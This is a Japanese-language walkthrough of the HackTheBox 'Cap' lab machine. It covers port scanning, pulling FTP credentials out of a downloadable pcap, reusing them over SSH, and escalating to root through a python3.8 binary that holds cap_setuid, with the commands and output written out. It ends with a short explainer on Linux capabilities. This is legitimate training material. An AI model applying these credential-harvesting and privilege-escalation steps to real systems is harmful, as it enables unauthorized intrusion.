---
title: 'Cap'
description: 'HackTheBox MachineのWriteupです。'
pubDate: 2026-02-10T18:40
category: 'HTB'
tags: ['HTB Machine', 'Writeup', 'Linux', 'Web', 'Capability', 'FTP', 'Packet Capture']
---

# Cap - HackTheBox

## 初期侵入
### ポート調査
```bash
nmap 10.129.251.169 -Pn
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

nmap 10.129.251.169 -Pn -p 22,80 -A
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
```

### Webアクセス
アクセスすると  
`http://127.0.0.1:8080/data/1`
数値をいじってると0に多くのデータが含まれており、pcapファイルをダウンロード  
ポートでftpが開いていたのでfilterでftpを見てみると  
`USER: nathan, PASS: Buck3tH4TF0RM3!`　Login successful  
この情報をもとにftpにアクセスする
```bash
ftp 10.129.251.169
Connected to 10.129.251.169.
220 (vsFTPd 3.0.3)
Name (10.129.251.169:kali): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36698|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Feb 10 06:08 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||13192|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |*******************************************************************************************************************************************************************************|    33       18.77 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.33 KiB/s)
```
### user.txtファイルの確認
user flagだった
```bash
$ cat user.txt
***
```

### SSHアクセス
さっき取得したftpの認証情報をsshで使ってみたらアクセスできた
```bash
$ ssh nathan@10.129.251.169 # Buck3tH4TF0RM3!
nathan@cap:~$
nathan@cap:~$ ls
user.txt # さっきのファイルと同じ
```

## 権限昇格
### linpeas.shで調査
```bash
                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
/snap/bin/lxc
/usr/sbin/apparmor_parser
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/usr/sbin/capsh
/usr/sbin/setcap # capability設定 setcap cap_net_raw+ep /usr/bin/ping
/usr/sbin/getcap # 設定確認 getcap /usr/bin/ping

Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# ls /root/
root.txt  snap
```

現在のcapability設定を見る方法
```bash
getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

> **Linux capability**  
root権限を機能ごとに細かく分割したもの、SUIDみたいなものだがより細かく管理が大変

| capability | Granting is dangerous |
| --- | --- |
| cap_setuid | python, perl, bash |
| cap_sys_admin | ほぼ全部 |
| cap_dac_override | ファイル操作ツール |
| cap_net_raw | tcpdump, python |
|etc |

| flag | description |
| --- | --- |
| e | 実行時に有効 |
| i | 子プロセスに継承 |
| p | 使用許可 |